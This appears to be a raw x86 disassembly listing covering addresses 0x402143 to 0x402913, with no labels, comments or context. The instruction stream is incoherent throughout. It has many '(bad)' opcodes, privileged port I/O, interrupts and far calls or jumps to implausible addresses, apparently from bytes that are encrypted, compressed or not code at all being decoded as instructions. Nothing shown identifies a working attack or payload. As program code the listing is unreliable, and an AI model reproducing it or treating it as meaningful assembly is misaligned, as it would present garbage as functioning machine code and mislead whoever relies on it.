  402143:	mov    gs:0xc96594ea,al
  402149:	sub    eax,DWORD PTR [ecx+0x5f]
  40214c:	dec    BYTE PTR ds:0x288d3273
  402152:	aaa    
  402153:	jb     0x40215b
  402155:	sahf   
  402156:	push   ecx
  402157:	outs   dx,DWORD PTR ds:[esi]
  402158:	out    dx,al
  402159:	aad    0x67
  40215b:	test   DWORD PTR [eax],edi
  40215d:	inc    ecx
  40215e:	outs   dx,BYTE PTR ds:[esi]
  40215f:	aaa    
  402160:	cmp    al,0x1b
  402162:	js     0x4020e6
  402164:	xchg   edx,eax
  402165:	pop    ecx
  402166:	pop    edx
  402167:	pop    eax
  402168:	mov    ah,0x11
  40216a:	sbb    ecx,0x27
  40216d:	test   BYTE PTR [ecx],al
  40216f:	sti    
  402170:	dec    edi
  402171:	jns    0x4021e2
  402173:	in     al,0xd9
  402175:	out    0xf3,eax
  402177:	cmp    eax,0x31149856
  40217c:	idiv   DWORD PTR [ecx+0xa]
  40217f:	sub    al,0xe3
  402181:	sahf   
  402182:	jbe    0x4021eb
  402184:	xor    BYTE PTR [ecx+ecx*1-0x6242bcda],dh
  40218b:	test   bh,dh
  40218d:	xchg   ecx,eax
  40218f:	test   BYTE PTR [ebx],0x1f
  402192:	jne    0x402123
  402194:	neg    DWORD PTR [edx*8+0x7753c1f6]
  40219b:	nop
  40219c:	ror    DWORD PTR [ecx-0x3598ad42],cl
  4021a2:	sti    
  4021a3:	in     al,0x54
  4021a5:	ret    0x390a
  4021a8:	push   ebp
  4021a9:	mov    ds:0xc1c964c8,eax
  4021ae:	les    eax,FWORD PTR [eax]
  4021b0:	call   0x730d:0xb25a4084
  4021b7:	call   0x313e0c45
  4021bc:	pop    eax
  4021bd:	adc    BYTE PTR [ebx+0x17],ch
  4021c0:	adc    ecx,eax
  4021c2:	adc    al,0xa5
  4021c4:	mov    eax,0xf5d2e53c
  4021c9:	mov    bl,0xe3
  4021cb:	push   ecx
  4021cc:	fldenv [esi+0x3cb5e313]
  4021d2:	push   0x66
  4021d4:	xchg   ebp,eax
  4021d5:	inc    eax
  4021d6:	lea    eax,[esi-0x334a926f]
  4021dc:	xor    cl,cl
  4021de:	loop   0x4021a0
  4021e0:	std    
  4021e1:	or     BYTE PTR [ebx+0x40aa3334],dh
  4021e7:	scas   eax,DWORD PTR es:[edi]
  4021e8:	and    bl,BYTE PTR [edx+0x41]
  4021eb:	cmp    edi,esp
  4021ed:	push   esp
  4021ee:	ret    0xd895
  4021f1:	add    BYTE PTR [edi+0x69],dl
  4021f4:	inc    esi
  4021f5:	mov    ch,0xa6
  4021f7:	push   es
  4021f8:	outs   dx,DWORD PTR ds:[esi]
  4021f9:	test   edi,esi
  4021fb:	(bad)  
  4021fd:	mov    al,ds:0xcb15dbf6
  402202:	jb     0x402214
  402204:	jne    0x40222b
  402206:	push   edi
  402207:	jns    0x4021e2
  402209:	shl    BYTE PTR [ebp-0x205648ed],cl
  40220f:	(bad)  
  402210:	xor    bl,bl
  402212:	mov    cl,0x29
  402214:	fld    QWORD PTR [ebp-0x6384e9db]
  40221a:	fnsave [esi-0x34cc4174]
  402220:	cs push ss
  402222:	or     esi,DWORD PTR [esi*1-0x11b03e83]
  402229:	(bad)  
  40222b:	out    0x4f,eax
  40222d:	jb     0x402241
  40222f:	jg     0x402258
  402231:	mov    edi,0x1b6fd635
  402236:	outs   dx,BYTE PTR ds:[esi]
  402237:	rcl    BYTE PTR [ebx+0x47],cl
  40223a:	fbld   TBYTE PTR [esi]
  40223c:	add    bh,BYTE PTR ds:0xec292c81
  402242:	ins    DWORD PTR es:[edi],dx
  402243:	ins    BYTE PTR es:[edi],dx
  402244:	add    al,0xf5
  402246:	fidiv  WORD PTR [edx+0x5fef9740]
  40224c:	mov    esp,0x5ec9120f
  402251:	or     eax,0x16186f6
  402256:	sbb    esp,ecx
  402258:	scas   eax,DWORD PTR es:[edi]
  402259:	fistp  QWORD PTR [ecx]
  40225b:	xchg   esi,eax
  40225c:	retf   
  40225d:	and    edx,DWORD PTR [edi]
  40225f:	fsub   DWORD PTR [eax+0x5e]
  402262:	mov    bh,0xd9
  402264:	fsubr  QWORD PTR [esi+0x791e2db1]
  40226a:	fdiv   DWORD PTR [edi+0xb]
  40226d:	dec    ebp
  40226e:	les    ebp,FWORD PTR [esi]
  402270:	ja     0x40229b
  402272:	(bad)  
  402273:	loopne 0x40221c
  402275:	xchg   BYTE PTR [eax],ch
  402277:	dec    esi
  402278:	lea    eax,ds:0xfa6dfc3b
  40227e:	cmp    DWORD PTR [esi],esi
  402280:	rcl    BYTE PTR [esi-0x7a],1
  402283:	iret   
  402284:	adc    eax,0xc948f5ad
  402289:	add    DWORD PTR [ebx+edx*1+0x54e6b2aa],0x1a
  402291:	dec    ecx
  402292:	scas   eax,DWORD PTR es:[edi]
  402293:	out    0xfc,al
  402295:	lods   al,BYTE PTR ds:[esi]
  402296:	imul   esi,DWORD PTR [esi+0x4c],0xffffffa6
  40229a:	inc    esp
  40229b:	call   0x74d0:0x5a7dc1ef
  4022a2:	in     eax,dx
  4022a3:	in     al,0x34
  4022a5:	sbb    ecx,ebp
  4022a7:	mov    eax,ds:0x37b6028d
  4022ac:	loop   0x402269
  4022ae:	mov    eax,0x2adaa1b2
  4022b3:	test   bh,ch
  4022b5:	in     eax,0x85
  4022b7:	int    0xa
  4022b9:	mov    DWORD PTR ds:0x4b65598d,ebp
  4022bf:	cmp    al,0xdc
  4022c1:	gs mov esp,0xa4461f0
  4022c7:	jp     0x4022ac
  4022c9:	sbb    edi,esp
  4022cb:	or     dl,ah
  4022cd:	icebp  
  4022ce:	fcmovb st,st(2)
  4022d0:	pop    es
  4022d1:	lea    edi,[ebp+eax*4+0x1d]
  4022d5:	and    BYTE PTR [ecx],0x20
  4022d8:	(bad)  
  4022d9:	cld    
  4022da:	lods   eax,DWORD PTR ds:[esi]
  4022db:	cld    
  4022dc:	ja     0x402274
  4022de:	clc    
  4022df:	xor    DWORD PTR [edx-0x57f42b7b],edx
  4022e5:	push   esp
  4022e6:	push   ebx
  4022e7:	dec    ecx
  4022e8:	add    al,0xe8
  4022ea:	out    0x81,al
  4022ec:	fdiv   st,st(5)
  4022ee:	jo     0x4022ea
  4022f0:	iret   
  4022f1:	or     ebp,DWORD PTR [esi]
  4022f3:	test   DWORD PTR [esi],ebp
  4022f5:	ins    DWORD PTR es:[edi],dx
  4022f6:	pop    eax
  4022f7:	cmp    DWORD PTR [ecx-0x4a37fa9b],ecx
  4022fd:	mov    al,0xf8
  4022ff:	jnp    0x402343
  402301:	jns    0x40231e
  402303:	js     0x40231a
  402305:	push   eax
  402306:	repz pop ebx
  402308:	imul   edi,DWORD PTR [ebx],0xffffffd4
  40230b:	shl    ebp,cl
  40230d:	or     al,0xdf
  40230f:	dec    esi
  402310:	ret    
  402311:	xchg   esi,eax
  402312:	adc    bh,BYTE PTR [ebx]
  402314:	add    al,0x7d
  402316:	dec    esi
  402317:	jmp    0x4022c7
  402319:	ror    BYTE PTR [ecx-0x275279c2],0x99
  402320:	pop    es
  402321:	ja     0x402345
  402323:	xor    dh,BYTE PTR [ebx]
  402325:	fst    st(6)
  402327:	pop    ebx
  402328:	pop    esp
  402329:	imul   esi,DWORD PTR [edx],0x51
  40232c:	jne    0x402352
  40232e:	mov    dl,0x95
  402330:	bound  esi,QWORD PTR [edi-0x5ad5cdd8]
  402336:	xor    BYTE PTR [ebx-0x7e3c7556],dh
  40233c:	fisubr DWORD PTR [edx+0x52]
  40233f:	scas   eax,DWORD PTR es:[edi]
  402340:	dec    esp
  402341:	push   0xc1c57de5
  402346:	or     al,0xd3
  402348:	shl    DWORD PTR [edi],cl
  40234a:	pushf  
  40234b:	cs mov edi,0x576a49fa
  402351:	sub    ebx,DWORD PTR [ebx-0x1a]
  402354:	xchg   esi,edx
  402356:	cmc    
  402357:	(bad)  
  402358:	loope  0x4022e0
  40235a:	adc    bl,dh
  40235c:	es push edx
  40235e:	or     BYTE PTR [ebp-0x5b954c2e],dl
  402364:	cwde   
  402365:	mov    dl,0x94
  402367:	sub    DWORD PTR [ecx],edi
  402369:	mov    ebp,0x8971c2b3
  40236e:	repz pop ebx
  402370:	je     0x402382
  402372:	(bad)  
  402373:	and    edi,DWORD PTR [ebx]
  402375:	gs jb  0x402315
  402378:	jne    0x40234b
  40237a:	and    DWORD PTR [edi],esi
  40237c:	jo     0x4023c0
  40237e:	or     DWORD PTR [ebp-0x570f2fac],ebx
  402384:	or     DWORD PTR [eax],esp
  402386:	push   esi
  402387:	in     eax,dx
  402388:	push   ebp
  402389:	dec    esi
  40238a:	es sub eax,0x71fe4a2b
  402390:	jge    0x4023f3
  402392:	js     0x40240e
  402394:	test   DWORD PTR [ebx+ecx*1],ebx
  402397:	xlat   BYTE PTR ds:[ebx]
  402398:	jl     0x402412
  40239a:	fsub   DWORD PTR [edx]
  40239c:	jge    0x4023b6
  40239e:	cdq    
  40239f:	sbb    eax,0x8b0a1432
  4023a4:	jnp    0x4023e9
  4023a6:	rcl    edx,cl
  4023a8:	dec    ebx
  4023a9:	adc    al,0xe6
  4023ab:	mov    BYTE PTR [esi+0x1bf5febb],ch
  4023b1:	jo     0x4023b7
  4023b3:	loopne 0x402416
  4023b5:	aam    0xe8
  4023b7:	inc    esi
  4023b8:	pop    edi
  4023b9:	mov    dh,0xea
  4023bb:	sub    esi,DWORD PTR [ecx+0x6c]
  4023be:	sbb    dl,BYTE PTR [ecx-0x31508c0a]
  4023c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023c5:	sub    al,dl
  4023c7:	mov    ah,0x88
  4023c9:	fisubr DWORD PTR ds:0x89e3d53d
  4023cf:	add    dh,BYTE PTR [eax+0x5db1c1c8]
  4023d5:	test   DWORD PTR [edx],ebp
  4023d7:	addr16 int3 
  4023d9:	lods   eax,DWORD PTR ds:[esi]
  4023da:	inc    ebx
  4023db:	repz (bad) 
  4023dd:	xor    al,0xf9
  4023df:	push   ebx
  4023e0:	stos   DWORD PTR es:[edi],eax
  4023e1:	jmp    0x8852202c
  4023e6:	dec    esp
  4023e7:	inc    ecx
  4023e8:	pop    ebp
  4023e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023ea:	jnp    0x402396
  4023ec:	sahf   
  4023ed:	cmp    DWORD PTR [esi+esi*1+0x2a56f31e],ebx
  4023f4:	mov    edi,0xd9167c5e
  4023f9:	aaa    
  4023fa:	inc    ebx
  4023fb:	or     BYTE PTR [ecx-0x170c7aba],0x7e
  402402:	push   ss
  402403:	jb     0x4023ec
  402405:	sti    
  402406:	mov    ch,0x70
  402408:	out    0xcc,al
  40240a:	mov    al,0x5f
  40240c:	aad    0xee
  40240e:	jb     0x4023c7
  402410:	xchg   ebp,eax
  402411:	add    BYTE PTR [ebx-0x6904f350],al
  402417:	xlat   BYTE PTR gs:[ebx]
  402419:	pop    ebp
  40241a:	leave  
  40241b:	or     BYTE PTR [ebp-0x4e92f210],0x86
  402422:	jge    0x40247e
  402424:	inc    esi
  402425:	push   ebx
  402426:	jnp    0x4023e9
  402428:	stc    
  402429:	inc    ebx
  40242a:	jl     0x40249b
  40242c:	or     eax,0xd0c18d81
  402431:	cmp    al,0x50
  402433:	bound  edi,QWORD PTR [eax-0x79173e71]
  402439:	and    edi,edx
  40243b:	(bad)  
  40243c:	push   ebp
  40243d:	or     eax,0x1a49a54
  402442:	outs   dx,DWORD PTR ds:[esi]
  402443:	jnp    0x402427
  402445:	jo     0x4024c3
  402447:	add    eax,DWORD PTR ds:0xc1b228bb
  40244d:	cmp    al,0x97
  40244f:	dec    ebp
  402450:	jbe    0x4023fd
  402452:	sbb    DWORD PTR [esi-0x303da47b],ebp
  402458:	shl    DWORD PTR [edx-0x63],0x1c
  40245c:	xchg   esp,eax
  40245d:	and    BYTE PTR [ebx+0x2f775df3],dl
  402463:	pop    ebp
  402464:	clc    
  402465:	or     bl,BYTE PTR [esi+0xb]
  402468:	jge    0x4024c0
  40246a:	jno    0x402491
  40246c:	jge    0x402406
  40246e:	lods   eax,DWORD PTR ds:[esi]
  40246f:	gs enter 0x3441,0x4e
  402474:	jge    0x4024a4
  402476:	outs   dx,BYTE PTR ds:[esi]
  402477:	ret    0x7d75
  40247a:	xchg   BYTE PTR [edx+eiz*2],dl
  40247d:	iret   
  40247e:	scas   eax,DWORD PTR es:[edi]
  40247f:	push   ebp
  402480:	jle    0x4024a8
  402482:	push   cs
  402483:	in     al,0x2d
  402485:	adc    ah,dh
  402487:	or     edi,ebp
  402489:	ja     0x4024be
  40248b:	mov    ?,WORD PTR [edi+0x2b]
  40248e:	push   cs
  40248f:	aam    0xda
  402491:	mov    DWORD PTR [ebx-0x7de87c30],esp
  402497:	addr16 ret 0x7ac8
  40249b:	jmp    0xd8b4646
  4024a0:	cmp    esp,DWORD PTR [esi-0x12]
  4024a3:	pop    ecx
  4024a4:	inc    ecx
  4024a5:	pop    ebp
  4024a6:	ret    
  4024a7:	int3   
  4024a8:	cli    
  4024a9:	jno    0x402436
  4024ab:	and    al,0xf3
  4024ad:	(bad)  
  4024ae:	test   al,0x9f
  4024b0:	inc    eax
  4024b1:	fsub   DWORD PTR [eax]
  4024b3:	inc    ebp
  4024b4:	shr    bl,0xd0
  4024b7:	shl    BYTE PTR [bx-0x42],cl
  4024bb:	mov    ecx,0xb2c629be
  4024c0:	pop    esi
  4024c1:	retf   
  4024c2:	inc    ebx
  4024c3:	sbb    al,cl
  4024c5:	xor    DWORD PTR [edx-0x80],esp
  4024c8:	inc    ebp
  4024c9:	jg     0x40250a
  4024cb:	dec    ebp
  4024cc:	std    
  4024cd:	adc    edx,DWORD PTR fs:[eax-0x4c75cd08]
  4024d4:	jmp    0x40249e
  4024d6:	and    BYTE PTR [edi+0x5441303f],0xbc
  4024dd:	mov    al,ds:0xe153c95f
  4024e2:	loop   0x402558
  4024e4:	jae    0x402481
  4024e6:	(bad)
  4024e9:	ret    0xb865
  4024ec:	in     al,0x6
  4024ee:	lods   eax,DWORD PTR ds:[esi]
  4024ef:	cmp    al,0xd7
  4024f1:	add    BYTE PTR [ecx],ch
  4024f3:	pop    edx
  4024f4:	fcmovu st,st(3)
  4024f6:	push   ss
  4024f7:	rcl    DWORD PTR ds:0xc54a843,cl
  4024fd:	sub    DWORD PTR [edx+0x7f],edi
  402500:	adc    eax,0x47f65ec7
  402505:	in     eax,0x8e
  402507:	jg     0x402582
  402509:	out    0x28,eax
  40250b:	in     al,dx
  40250c:	xchg   ebx,eax
  40250d:	add    esp,DWORD PTR [edx-0x6e2010ec]
  402513:	test   al,0xb8
  402515:	cmp    al,ah
  402517:	sub    esp,DWORD PTR [edx]
  402519:	std    
  40251a:	test   eax,0xcd48a060
  40251f:	test   DWORD PTR [ecx+edi*8],edi
  402522:	dec    ebx
  402523:	mov    ecx,?
  402525:	loope  0x4024ba
  402527:	add    ah,ch
  402529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40252a:	xchg   ebx,eax
  40252b:	push   ebx
  40252c:	inc    esi
  40252d:	xor    DWORD PTR [edi+edi*2-0x22],0xde35573
  402535:	test   al,0x31
  402537:	adc    esi,DWORD PTR [eax-0x76]
  40253a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40253b:	jb     0x4025ab
  40253d:	pop    ebx
  40253e:	xchg   ebp,eax
  40253f:	pop    ebx
  402540:	rol    BYTE PTR [esi+0x4b],cl
  402543:	push   eax
  402544:	das    
  402545:	dec    ebp
  402546:	dec    eax
  402547:	outs   dx,DWORD PTR ds:[esi]
  402548:	imul   esi,edx,0x11
  40254b:	inc    esi
  40254c:	call   0xc2f8b499
  402551:	loope  0x4024e2
  402553:	adc    eax,0x7a35905b
  402558:	mov    esp,0xe628afb0
  40255d:	ss jg  0x4025c2
  402560:	jae    0x402585
  402562:	mov    dl,0x69
  402564:	fidiv  DWORD PTR [ebx-0x6]
  402567:	rcl    DWORD PTR [esi],1
  402569:	test   al,0x2f
  40256b:	and    dh,BYTE PTR [eax]
  40256d:	xchg   edx,eax
  40256e:	cmp    BYTE PTR [edx-0x2e],0xa9
  402572:	adc    DWORD PTR [edi+0x39],eax
  402575:	popa   
  402576:	pop    ss
  402577:	out    dx,eax
  402578:	sbb    eax,0xce5ab101
  40257d:	aad    0xff
  40257f:	ret    0xf98d
  402582:	cmp    al,BYTE PTR [edi]
  402584:	adc    ch,BYTE PTR [eax+ebx*4+0x60]
  402588:	sbb    dh,BYTE PTR [edi+0x53fd7240]
  40258e:	pop    esp
  40258f:	dec    esp
  402590:	add    edx,esp
  402592:	xchg   esi,eax
  402593:	xor    bl,BYTE PTR [ecx]
  402595:	ds and esp,DWORD PTR ds:[edi+edx*4+0x20]
  40259b:	cmp    al,0x1d
  40259d:	call   0xa6d0c61a
  4025a2:	push   edi
  4025a3:	and    al,0x44
  4025a5:	repz cmc 
  4025a7:	(bad)  
  4025a9:	shl    BYTE PTR [ebx+edi*1+0x22],cl
  4025ad:	nop
  4025ae:	mov    DWORD PTR [ecx+0x4a],edx
  4025b1:	and    al,0x75
  4025b3:	sbb    eax,0xdab28599
  4025b8:	int3   
  4025b9:	push   edi
  4025ba:	jns    0x4025cd
  4025bc:	jle    0x4025ac
  4025be:	mov    WORD PTR [ebx-0x97b621d],es
  4025c4:	test   BYTE PTR [ebx],bl
  4025c6:	scas   al,BYTE PTR es:[edi]
  4025c7:	dec    eax
  4025c8:	int3   
  4025c9:	into   
  4025ca:	dec    ebx
  4025cb:	out    0x72,eax
  4025cd:	jmp    0x40263e
  4025cf:	mov    ebp,0x1f459501
  4025d4:	(bad)  
  4025d5:	sub    eax,DWORD PTR [esi]
  4025d7:	test   eax,0x315de8a2
  4025dc:	mov    ds:0x8bd8d48,eax
  4025e1:	sbb    eax,0xfcee420f
  4025e6:	mov    al,ds:0x5329fc70
  4025eb:	cli    
  4025ec:	pop    ds
  4025ed:	das    
  4025ee:	pusha  
  4025ef:	data16 out dx,al
  4025f1:	retf   
  4025f2:	sbb    DWORD PTR [edi-0x5d],ebx
  4025f5:	enter  0xabbf,0x64
  4025f9:	and    al,0xb8
  4025fb:	outs   dx,BYTE PTR ds:[esi]
  4025fc:	jae    0x402600
  4025fe:	or     ebp,DWORD PTR [ebp-0x15]
  402601:	or     bh,BYTE PTR [edi-0x3ee8d2e9]
  402607:	(bad)  
  402608:	js     0x40259c
  40260a:	addr16 jmp 0x4025d1
  40260d:	mov    ds:0x61563f28,eax
  402612:	daa    
  402613:	lahf   
  402614:	add    esi,DWORD PTR [eax-0x7a1747d8]
  40261a:	push   eax
  40261b:	xor    al,0xd9
  40261d:	cld    
  40261e:	push   es
  40261f:	outs   dx,DWORD PTR ds:[esi]
  402620:	mov    BYTE PTR [eax-0x20f0edef],dh
  402626:	stc    
  402627:	push   esi
  402628:	(bad)  
  402629:	stc    
  40262a:	jle    0x4025b5
  40262c:	add    DWORD PTR [ecx+0x58bb5e8a],ecx
  402632:	in     al,0x2
  402634:	adc    BYTE PTR [ebx],bl
  402636:	mov    eax,ds:0xea10cae8
  40263b:	fsincos 
  40263d:	scas   al,BYTE PTR es:[edi]
  40263e:	mov    ch,0xf8
  402640:	cmp    DWORD PTR [ebp+0x6],eax
  402643:	out    0xb,al
  402645:	sbb    eax,0xe54a0abe
  40264a:	add    dl,ch
  40264c:	jo     0x40261b
  40264e:	das    
  40264f:	stos   BYTE PTR es:[edi],al
  402650:	mov    eax,ds:0x8fbb41df
  402655:	inc    esp
  402656:	or     ah,ch
  402658:	lahf   
  402659:	fist   DWORD PTR [ebx-0x1a]
  40265c:	pop    esp
  40265d:	repnz mov eax,0x1d959cfa
  402663:	int    0x7e
  402665:	sbb    DWORD PTR [edi+0x3b],edi
  402668:	dec    ecx
  402669:	lds    edx,FWORD PTR [edx+eax*1]
  40266c:	arpl   WORD PTR [ebp+ecx*1+0x69e92a80],bp
  402673:	ss inc ebx
  402675:	cmp    BYTE PTR fs:[edi],bl
  402678:	scas   al,BYTE PTR es:[edi]
  402679:	inc    esi
  40267a:	ins    BYTE PTR es:[edi],dx
  40267b:	push   ds
  40267c:	jge    0x402630
  40267e:	sbb    BYTE PTR [ecx-0x3c],dh
  402681:	cmp    eax,0x384deced
  402686:	inc    ebp
  402687:	sbb    DWORD PTR [edx-0x50],edi
  40268a:	cmp    BYTE PTR [eax+0xf18f402],0x4b
  402691:	test   eax,0x5c9d4f09
  402696:	jecxz  0x4026df
  402698:	xor    esi,DWORD PTR [esi-0x1e]
  40269b:	aaa    
  40269c:	mov    ecx,0xac376014
  4026a1:	and    al,0x93
  4026a3:	(bad)  
  4026a4:	retf   0xf66d
  4026a7:	mov    ds:0x872fa174,eax
  4026ac:	repz daa 
  4026ae:	mov    eax,?
  4026b0:	mov    edi,ebx
  4026b2:	mov    eax,DWORD PTR [ecx]
  4026b4:	out    dx,al
  4026b5:	and    BYTE PTR [edx-0x66],al
  4026b8:	inc    esp
  4026b9:	pop    ebp
  4026ba:	mov    ah,0xb0
  4026bc:	jl     0x4026e7
  4026be:	rcl    DWORD PTR [ebx-0x160ff9db],1
  4026c4:	jne    0x40266b
  4026c6:	xchg   DWORD PTR [edx-0x2],ebx
  4026c9:	(bad)  
  4026ca:	mov    ah,0x90
  4026cc:	inc    esp
  4026cd:	add    DWORD PTR [ebx-0x5f],esi
  4026d0:	jne    0x402696
  4026d2:	mov    ah,0x7a
  4026d4:	jp     0x4026b7
  4026d6:	sub    ebp,DWORD PTR [ecx-0x315eac3c]
  4026dc:	bnd call 0xbb328f1b
  4026e2:	cli    
  4026e3:	sahf   
  4026e4:	sbb    cl,BYTE PTR [ebx+0x6bcf984f]
  4026ea:	add    bl,BYTE PTR [ebx+0x519e31f2]
  4026f0:	pop    ecx
  4026f1:	xchg   edx,ebp
  4026f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026f4:	data16 sub BYTE PTR ds:[ebx-0x57],bl
  4026f9:	sbb    eax,0xa90b3bf0
  4026fe:	cmc    
  4026ff:	xchg   ebx,eax
  402700:	xor    DWORD PTR [eax],ebx
  402702:	arpl   bp,ax
  402704:	ficomp WORD PTR [ebx+0x2d]
  402707:	lds    ecx,FWORD PTR [edx-0x3126e15]
  40270d:	clc    
  40270e:	mov    ?,WORD PTR [eax+0x43]
  402711:	mov    ds:0x1f3fb9ab,al
  402716:	addr16 jns 0x4026a5
  402719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40271a:	add    eax,0x1fcac6bc
  40271f:	int3   
  402720:	sub    dh,BYTE PTR [esi]
  402722:	push   ds
  402723:	push   edi
  402724:	push   edi
  402725:	shl    esi,0xeb
  402728:	test   DWORD PTR [esi-0x4d],0x8bdbb4de
  40272f:	pop    ebx
  402730:	idiv   ebx
  402732:	in     eax,dx
  402733:	xchg   ebp,eax
  402734:	das    
  402735:	ficomp WORD PTR [esi+0x74]
  402738:	loopne 0x40279e
  40273a:	popf   
  40273b:	(bad)  
  40273c:	daa    
  40273d:	add    BYTE PTR [eax],ah
  40273f:	rcl    DWORD PTR [esi],0x6f
  402742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402743:	fidiv  WORD PTR [eax+0x5d]
  402746:	inc    edx
  402747:	call   0x21276086
  40274c:	test   eax,0xdd857044
  402751:	enter  0xea9c,0x85
  402755:	clc    
  402756:	pop    ebx
  402757:	dec    ecx
  402758:	jo     0x402773
  40275a:	mov    ah,0x73
  40275c:	jmp    0x402790
  40275e:	test   BYTE PTR [edx+esi*2+0x10],cl
  402762:	inc    ebp
  402763:	mov    bl,ch
  402765:	mov    dh,0x63
  402767:	mov    edx,0xea0337e2
  40276c:	sub    al,0x30
  40276e:	jmp    0x33f9bc0b
  402773:	je     0x4027ed
  402775:	sbb    al,0x6b
  402777:	and    esp,DWORD PTR [esp+ebp*2+0x159b44de]
  40277e:	and    dl,BYTE PTR [ebp+0x15ac1dfb]
  402784:	add    al,0xaa
  402786:	inc    ecx
  402787:	into   
  402788:	lock sar BYTE PTR [esi-0x5b],cl
  40278c:	test   eax,0xdb9833bb
  402791:	jo     0x4027c4
  402793:	fidivr DWORD PTR [esi+0x70]
  402796:	xor    BYTE PTR [edi-0x360facd1],ch
  40279c:	sub    ah,al
  40279e:	les    esp,FWORD PTR [ebx-0x2]
  4027a1:	mov    dl,0x55
  4027a3:	fld    DWORD PTR [esp+ebx*2-0x2882747b]
  4027aa:	mov    dh,cl
  4027ac:	jae    0x4027a1
  4027ae:	xor    DWORD PTR [ebx],0x67e04acb
  4027b4:	adc    eax,0xc9f9e664
  4027b9:	add    DWORD PTR [ecx+ecx*8-0x413d1c6],edi
  4027c0:	mov    ds:0x32077f00,eax
  4027c5:	pop    ecx
  4027c6:	adc    esp,DWORD PTR [eax]
  4027c8:	fs out dx,eax
  4027ca:	aaa    
  4027cb:	loope  0x4027a0
  4027cd:	loopne 0x4027c4
  4027cf:	mov    edi,0x86a629c1
  4027d4:	lds    esp,FWORD PTR [ebp+0x22]
  4027d7:	mov    ebp,0xb0b62eb
  4027dc:	stc    
  4027dd:	sbb    DWORD PTR [ebp+0x7def3c24],ebx
  4027e3:	sbb    cl,BYTE PTR [esi]
  4027e5:	mov    al,0xd2
  4027e7:	mov    bl,0x90
  4027e9:	js     0x4027b0
  4027eb:	xchg   BYTE PTR [edi-0x34],ch
  4027ee:	adc    DWORD PTR [ebx-0x68],0x49
  4027f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027f3:	xchg   edx,eax
  4027f4:	sahf   
  4027f5:	ret    0x994e
  4027f8:	jmp    0x4027b1
  4027fa:	fwait
  4027fb:	xchg   BYTE PTR [edi+0x6f],bl
  4027fe:	lahf   
  4027ff:	nop
  402800:	push   esp
  402801:	sbb    al,0x3e
  402803:	fsub   QWORD PTR [edx+0x59]
  402806:	cmp    bl,BYTE PTR [eax]
  402808:	cs adc eax,0x919bf2c8
  40280e:	xor    DWORD PTR [eax-0x6f],esi
  402811:	or     BYTE PTR [esi+esi*2-0x18a51dcf],cl
  402818:	push   edi
  402819:	scas   al,BYTE PTR es:[edi]
  40281a:	mov    al,ds:0x980d252f
  40281f:	xor    edx,eax
  402821:	push   ebp
  402822:	add    al,0x93
  402824:	mov    dl,0x27
  402826:	out    dx,al
  402827:	jno    0x4028a0
  402829:	push   ds
  40282a:	mov    al,ds:0xe4366577
  40282f:	rcl    DWORD PTR [edx+0x5e47743d],1
  402835:	ins    DWORD PTR es:[edi],dx
  402836:	pop    DWORD PTR [eax-0x29]
  402839:	mov    cl,dh
  40283b:	adc    BYTE PTR [eax+0x5455f363],0xab
  402842:	mov    bh,ah
  402844:	sub    BYTE PTR [ebx],ah
  402846:	into   
  402847:	or     esp,esp
  402849:	mov    WORD PTR [ebx+0x9d0f91e],ds
  40284f:	pop    esp
  402850:	or     BYTE PTR [esi-0x33f71421],cl
  402856:	lds    ecx,FWORD PTR [eax-0x3c]
  402859:	push   ecx
  40285a:	sub    BYTE PTR [ebx],ah
  40285c:	xor    ebx,DWORD PTR ds:[ebp+0xc899100]
  402863:	inc    esi
  402864:	jge    0x40282d
  402866:	jp     0x40280c
  402868:	jecxz  0x402850
  40286a:	sub    DWORD PTR [eax],ebp
  40286c:	add    esp,ebx
  40286e:	mov    ebx,0x90c348cc
  402873:	mov    edx,ebp
  402875:	or     DWORD PTR [eax-0x6e098215],0x2d
  40287c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40287d:	adc    eax,0x20bdac5c
  402882:	out    0xc0,al
  402884:	adc    BYTE PTR [edi],0xf8
  402887:	mov    edx,ecx
  402889:	sub    al,0xfa
  40288b:	mov    cl,0x2a
  40288d:	das    
  40288e:	lods   eax,DWORD PTR ds:[esi]
  40288f:	cmp    BYTE PTR [ebx+0x6b508280],dl
  402895:	ins    DWORD PTR es:[edi],dx
  402896:	pop    edi
  402897:	inc    esp
  402898:	cmp    bl,cl
  40289a:	test   bp,dx
  40289d:	push   esp
  40289e:	mov    DWORD PTR [edx],0xc312325a
  4028a4:	cmp    ch,BYTE PTR [eax+0x719c514f]
  4028aa:	pop    ss
  4028ab:	push   cs
  4028ac:	aaa    
  4028ad:	jmp    0xd7449dbf
  4028b2:	jnp    0x402901
  4028b4:	push   0xffffff82
  4028b6:	jns    0x40283d
  4028b8:	imul   ebp,DWORD PTR ds:[edi-0x29a2b1ec],0xffffff9c
  4028c0:	arpl   WORD PTR [edi+edx*1-0x61],sp
  4028c4:	lock lock aaa 
  4028c7:	dec    edx
  4028c8:	push   edi
  4028c9:	dec    eax
  4028ca:	inc    edx
  4028cb:	push   edx
  4028cc:	push   edx
  4028cd:	aad    0x7
  4028cf:	and    al,0x56
  4028d1:	sbb    edx,ebp
  4028d3:	loope  0x4028e7
  4028d5:	mov    ebp,0x175234f9
  4028da:	lds    esi,FWORD PTR [edx+eiz*1-0x142c71d3]
  4028e1:	add    eax,0xeb9ba156
  4028e6:	cld    
  4028e7:	jns    0x4028dd
  4028e9:	out    dx,eax
  4028ea:	dec    ebp
  4028eb:	iret   
  4028ec:	pop    ebp
  4028ed:	test   al,0xb6
  4028ef:	add    BYTE PTR [edx-0x156d39fa],cl
  4028f5:	xchg   esi,eax
  4028f6:	sbb    al,0xb
  4028f8:	xchg   BYTE PTR [eax-0x372b3967],al
  4028fe:	pusha  
  4028ff:	xor    al,0xf9
  402901:	lahf   
  402902:	pop    es
  402903:	push   edx
  402904:	mov    cl,0x1
  402906:	jns    0x402986
  402908:	aas    
  402909:	rcl    BYTE PTR [ecx-0xb],0xf8
  40290d:	fadd   st,st(3)
  40290f:	sahf   
  402910:	out    0x2e,eax
  402912:	inc    ebx
  402913:	push   ecx
